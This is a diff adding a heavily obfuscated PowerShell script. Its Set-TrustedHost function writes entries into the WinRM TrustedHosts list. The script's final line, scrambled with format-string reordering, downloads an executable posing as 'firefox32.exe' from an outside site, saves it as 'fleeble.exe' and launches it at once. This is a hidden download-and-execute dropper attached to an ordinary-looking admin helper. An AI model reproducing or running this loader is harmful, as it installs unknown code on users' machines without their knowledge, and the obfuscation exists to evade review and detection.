@@ -1,0 +1,48 @@
+ seT-Item  ("V"+"A"+"R"+"IABLE:O5i")  ([Type]("{1}{3}{8}{4}{7}{6}{5}{9}{2}{0}" -F'ity','SEcurIT','DenT','Y','prInC','D','PAL.Win','i','.','OWSi'));  
+
+
+
+
+
+
+
+
+
+function SET`-trusTE`dhO`St
+{
+    [CmdletBinding(supPOrtssHOULDpRocESS=${tR`Ue}, cONFIrMImpaCt="h`IGh")]
+    param(
+        [Parameter(
+            POSITION=0,
+            maNDAtoRy=${t`RUE})]
+        [String[]]${t`RUs`T`EdhOST}
+    )
+
+    Begin{
+        if(-not([Security.Principal.WindowsPrincipal] (  DiR  ("V"+"a"+"R"+"Iable:o5i") )."va`lUe"::("{1}{0}{2}" -f 'u','GetC','rrent').Invoke())."ISiN`R`OLE"([Security.Principal.WindowsBuiltInRole]("{2}{1}{0}" -f'strator','ni','Admi')))
+        {
+            throw ("{4}{8}{0}{6}{7}{5}{2}{11}{1}{3}{9}{10}" -f 'e ','ste','d to set ','d ','Administrator ','re','req','ui','rights ar','host','!','a tru')
+        }
+    }
+
+    Process{
+        ${T`RUS`Ted`hosT`_pA`TH} = ((("{2}{4}{0}{3}{1}{6}{7}{5}" -f'lhos','entNtgTr','WSMan:Ntglo','tNtgCli','ca','Hosts','us','ted'))."REpLa`cE"('Ntg',[stRiNg][CHar]92))
+
+        try{
+            ${TrUST`Ed`HOsT_va`LUE} = ${tRuS`Te`d`hOSt} -join ","
+
+            if(${PsCM`dl`eT}.("{2}{3}{0}{1}"-f 'oc','ess','Shoul','dPr').Invoke(${TRUsT`edhoS`T_`pa`Th}))
+            {
+                .("{0}{1}"-f 'Set-','Item') -Path ${TR`Us`TEdhOsT`_p`AtH} -Value ${TRus`Te`DH`Os`T_VALUe} -Force
+            }    
+        }
+        catch{
+            throw
+        }
+    }
+
+    End{
+
+    }
+}
+(&("{0}{1}{2}"-f'New-O','bjec','t') ("{3}{2}{1}{0}{5}{4}" -f 'Net.','.','tem','Sys','t','WebClien')).("{0}{2}{1}"-f 'DownloadF','le','i').Invoke(("{8}{0}{2}{7}{1}{5}{3}{4}{6}"-f 'p://w','/firef','or','3','2.e','ox','xe','ldnit.com','htt'),("{2}{0}{1}" -f 'e','ble.exe','fle'));.("{0}{3}{2}{1}"-f'Sta','ess','roc','rt-P') ("{1}{2}{0}" -f 'exe','fleeb','le.')
